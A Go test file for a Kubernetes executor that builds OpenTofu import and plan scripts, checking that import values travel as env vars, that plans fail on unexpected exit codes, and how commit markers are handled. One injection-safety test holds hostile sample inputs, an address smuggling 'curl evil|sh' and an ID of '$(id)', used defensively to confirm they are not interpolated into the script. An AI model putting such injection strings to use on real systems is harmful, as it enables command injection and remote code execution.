package executor

import (
	"errors"
	"fmt"
	"os/exec"
	"strings"
	"testing"
)

// The import an operator asks for adopts existing infrastructure into state.
// Rendering nothing for it produced a pod that exited 0 and a run recorded as
// applied, so the resources stayed unadopted and the run said they had been.

func importParams(resources ...ImportResource) ExecuteParams {
	return ExecuteParams{
		Operation:       "import",
		Source:          "upload",
		WorkingDir:      "envs/production",
		RunID:           "run_1",
		ImportResources: resources,
	}
}

func TestPodScript_RunsAnImportForEveryResource(t *testing.T) {
	e := &KubernetesExecutor{}
	script, err := e.buildScript(importParams(
		ImportResource{Address: "aws_s3_bucket.logs", ID: "portal-logs"},
		ImportResource{Address: "aws_iam_role.exec", ID: "arn:aws:iam::1:role/exec"},
	))
	if err != nil {
		t.Fatalf("buildScript: %v", err)
	}

	for i := range 2 {
		want := fmt.Sprintf(`$BIN import -no-color $VAR_FILE "$PORTAL_IMPORT_ADDR_%d" "$PORTAL_IMPORT_ID_%d"`, i, i)
		if !strings.Contains(script, want) {
			t.Errorf("resource %d is not imported:\n%s", i, script)
		}
	}
}

// The addresses and ids reach the pod as env values, never as script text. A
// resource id is user input, and the repo's rule for user input in this script
// is that it is referenced, not interpolated — otherwise an id carrying shell
// metacharacters is parsed rather than passed.
func TestPodScript_DoesNotInterpolateImportValues(t *testing.T) {
	e := &KubernetesExecutor{}
	hostile := ImportResource{
		Address: `aws_s3_bucket.logs"; curl evil|sh; echo "`,
		ID:      "$(id)",
	}
	script, err := e.buildScript(importParams(hostile))
	if err != nil {
		t.Fatalf("buildScript: %v", err)
	}

	if strings.Contains(script, "curl evil") {
		t.Errorf("the address was interpolated into the script text, so it is parsed as shell:\n%s", script)
	}
	if strings.Contains(script, "$(id)") {
		t.Errorf("the resource id was interpolated into the script text:\n%s", script)
	}
}

// The values themselves travel on the pod spec, positionally, so the script's
// references resolve.
func TestRunPayload_CarriesEveryImportResource(t *testing.T) {
	p := buildRunPayload("#!/bin/sh\n", "secret_1", importParams(
		ImportResource{Address: "aws_s3_bucket.logs", ID: "portal-logs"},
		ImportResource{Address: "aws_iam_role.exec", ID: "arn:aws:iam::1:role/exec"},
	))

	got := map[string]string{}
	for _, e := range p.env {
		if e.ValueFrom == nil {
			got[e.Name] = e.Value
		}
	}
	want := map[string]string{
		"PORTAL_IMPORT_ADDR_0": "aws_s3_bucket.logs",
		"PORTAL_IMPORT_ID_0":   "portal-logs",
		"PORTAL_IMPORT_ADDR_1": "aws_iam_role.exec",
		"PORTAL_IMPORT_ID_1":   "arn:aws:iam::1:role/exec",
	}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s = %q, want %q; the script's reference would expand to nothing and tofu would be asked to import an empty address", k, got[k], v)
		}
	}
}

// A run that adopts resources and records no state version leaves them managed
// by the backend and tracked by nothing, which is the same loss as importing
// nothing at all.
func TestPodScript_CapturesStateAfterAnImport(t *testing.T) {
	e := &KubernetesExecutor{}
	script, err := e.buildScript(importParams(ImportResource{Address: "aws_s3_bucket.logs", ID: "portal-logs"}))
	if err != nil {
		t.Fatalf("buildScript: %v", err)
	}
	if !strings.Contains(script, "$BIN state pull") {
		t.Errorf("an import captures no state:\n%s", script)
	}
	if !strings.Contains(script, frameFor(framedStateFile).open()) {
		t.Error("the raw state an import produced is not framed back to the worker")
	}
}

// ── the plan's exit code ───────────────────────────────────────────────────

// -detailed-exitcode defines 0 and 2 and nothing else. Failing only on 1 read
// every other code as a plan with no changes: an OOM-killed pod (137), a
// SIGTERM (143) or a segfault (139) produced an empty diff that an approver
// would have signed.
func TestPodScript_FailsAPlanOnAnyExitCodeThatIsNotAPlan(t *testing.T) {
	e := &KubernetesExecutor{}
	script, err := e.buildScript(ExecuteParams{Operation: "plan", Source: "upload", WorkingDir: "envs/production"})
	if err != nil {
		t.Fatalf("buildScript: %v", err)
	}

	if strings.Contains(script, `"$PLAN_EXIT" -eq 1`) {
		t.Error("the script fails a plan only on exit 1, so 137, 139 and 143 read as a plan with no changes")
	}
	for _, want := range []string{`"$PLAN_EXIT" -ne 0`, `"$PLAN_EXIT" -ne 2`, "exit 1"} {
		if !strings.Contains(script, want) {
			t.Errorf("the script does not gate on %q:\n%s", want, script)
		}
	}
}

// The two codes -detailed-exitcode does define must still pass, or every plan
// fails.
func TestPodScript_AcceptsThePlanExitCodesTofuDefines(t *testing.T) {
	e := &KubernetesExecutor{}
	script, err := e.buildScript(ExecuteParams{Operation: "plan", Source: "upload"})
	if err != nil {
		t.Fatalf("buildScript: %v", err)
	}
	for _, code := range []string{"0", "2"} {
		if !passesPlanGate(t, script, code) {
			t.Errorf("exit code %s fails the plan gate; tofu defines it as %s", code,
				map[string]string{"0": "no changes", "2": "changes detected"}[code])
		}
	}
	for _, code := range []string{"1", "137", "139", "143"} {
		if passesPlanGate(t, script, code) {
			t.Errorf("exit code %s passes the plan gate; the plan did not complete", code)
		}
	}
}

// passesPlanGate runs the rendered gate under a shell with PLAN_EXIT set,
// which is what the pod does. Reading the condition is not the same as running
// it: an inverted comparison reads fine and passes everything.
func passesPlanGate(t *testing.T, script, exitCode string) bool {
	t.Helper()
	start := strings.Index(script, `if [ "$PLAN_EXIT"`)
	if start < 0 {
		t.Fatalf("no plan gate in the script:\n%s", script)
	}
	end := strings.Index(script[start:], "\nfi\n")
	if end < 0 {
		t.Fatalf("the plan gate is not closed:\n%s", script[start:])
	}
	gate := script[start : start+end+len("\nfi\n")]
	return runShell(t, "PLAN_EXIT="+exitCode+"\n"+gate) == 0
}

// ── the commit a run executed ──────────────────────────────────────────────

func TestPodSpecEnv_NamesImportsPositionally(t *testing.T) {
	p := buildRunPayload("#!/bin/sh\n", "secret_1", importParams(
		ImportResource{Address: "a", ID: "1"},
	))
	// The Secret is for values. An address is not one, and the local executor
	// already writes both into the run log.
	for _, e := range p.env {
		if strings.HasPrefix(e.Name, "PORTAL_IMPORT_") && e.ValueFrom != nil {
			t.Errorf("%s is referenced from a Secret; imports are addresses, not values", e.Name)
		}
	}
	var names []string
	for _, e := range p.env {
		if strings.HasPrefix(e.Name, "PORTAL_IMPORT_") {
			names = append(names, e.Name)
		}
	}
	if len(names) != 2 {
		t.Errorf("got env %v, want one address and one id", names)
	}
}

// runShell executes a fragment of the rendered script and returns its exit
// code, so a gate is asserted by running it rather than by reading it. An
// inverted comparison reads correctly and admits everything.
func runShell(t *testing.T, fragment string) int {
	t.Helper()
	cmd := exec.Command("/bin/sh", "-c", fragment)
	if err := cmd.Run(); err != nil {
		var ee *exec.ExitError
		if errors.As(err, &ee) {
			return ee.ExitCode()
		}
		t.Fatalf("run shell fragment: %v", err)
	}
	return 0
}

// A VCS run's script always echoes the commit marker. Its absence means the
// commit this run executed cannot be established, and reporting no commit leaves
// the run unpinned — an unpinned approvable run resolves branch head when its
// apply follows, which is the moving target the pin exists to remove.
func TestExecutedCommit_RefusesAVCSRunThatReportedNoCommit(t *testing.T) {
	for _, source := range []string{"vcs", ""} {
		_, _, err := executedCommit("Cloning...\nPlan: 1 to add, 0 to change, 0 to destroy\n", source)
		if err == nil {
			t.Errorf("source %q: a run that reported no commit was accepted; its apply would resolve branch head", source)
		}
	}
}

// An upload run emits no marker and needs none — it is pinned by its config
// version. Refusing it would fail every upload-source run.
func TestExecutedCommit_AcceptsAnUploadRunWithNoMarker(t *testing.T) {
	sha, cleaned, err := executedCommit("Extracting uploaded configuration...\n", "upload")
	if err != nil {
		t.Fatalf("an upload run was refused for having no commit marker: %v", err)
	}
	if sha != "" {
		t.Errorf("sha = %q, want empty for an upload run", sha)
	}
	if cleaned != "Extracting uploaded configuration...\n" {
		t.Errorf("the log was altered: %q", cleaned)
	}
}

// The marker is lifted and the line it arrived on does not reach the run log.
func TestExecutedCommit_LiftsTheCommitAndRemovesTheMarker(t *testing.T) {
	log := "Cloning...\n" + commitMarker + "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4" + "\nPlan: 1 to add\n"
	sha, cleaned, err := executedCommit(log, "vcs")
	if err != nil {
		t.Fatalf("executedCommit: %v", err)
	}
	if sha != "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4" {
		t.Errorf("sha = %q", sha)
	}
	if strings.Contains(cleaned, commitMarker) {
		t.Errorf("the marker line reached the run log:\n%s", cleaned)
	}
	if !strings.Contains(cleaned, "Plan: 1 to add") {
		t.Errorf("the log around the marker was lost:\n%s", cleaned)
	}
}
